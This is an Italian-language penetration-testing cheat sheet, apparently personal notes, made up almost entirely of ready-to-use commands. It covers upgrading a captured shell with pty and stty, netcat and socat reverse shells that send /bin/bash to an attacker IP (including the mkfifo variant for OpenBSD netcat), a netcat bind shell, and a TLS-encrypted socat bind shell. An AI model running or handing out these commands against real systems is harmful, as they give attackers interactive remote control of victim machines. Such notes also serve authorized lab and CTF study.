# Upgrade Shell
Macchina Vittima
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
Macchina Attaccante (segnare il numero di righe e colonne)
```bash
stty -a 
```
Macchina Vittima (sostituire il numero di righe e colonne con quelle segnate)
```bash
export TERM=xterm-256color
stty rows 38 columns 169
^Z
```
**RICORDA** ^Z = (Ctrl + Z)
Macchina Attaccante 
```bash
stty -raw echo; fg
```
-------------------------
# Reverse-shell
## nc
### Macchina attaccate
```bash
nc -lvnp <PORT>
```
### Macchina vittima
```bash
nc <MIO_IP> <PORT>
```
#### Reverse shell per OpenBSD netcat
Reverse shell per ambienti con netcat compilati senza il flag *-DGAPING_SECURITY_HOLE* (OpenBSD version)
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <MIO_IP> <PORT> >/tmp/f
```
## socat
Macchina  attaccante
```bash
socat -d TCP4-LISTEN:<PORT> STDOUT
```
Macchina vittima 
```bash
socat - TCP4:<MIO_IP>:<PORT> EXEC:/bin/bash
```
-------------------------
# Bind shell 
Macchina vittima
```bash
nc -lvnp 4242 -e /bin/bash
```
Macchina attaccante
```bash
nc <IP VITTIMA> <PORT>
```
### Encrypted Bind Shell
Inizialmente si ha la necessita di creare il certificato e la chiave privata per la creazione del canale cifrato 
```bash
#Generazione della chiave e del certificato
openssl req -x509 -newkey rsa:2048 -nodes -keyout rootCAKey.key -days 365 -out rootCACert.pem
#Combinare il certificato e la chiave per darlo in input a socat
cat rootCACert.pem rootCAKey.key > shell.pem
```
Macchina  vittima
```bash
socat OPENSSL-LISTEN:<PORTA>,cert=shell.pem,verify=0,fork EXEC:/bin/bash
```
Macchina attaccante 
```bash
socat - OPENSSL:<IP>:<PORTA>,verify=0
```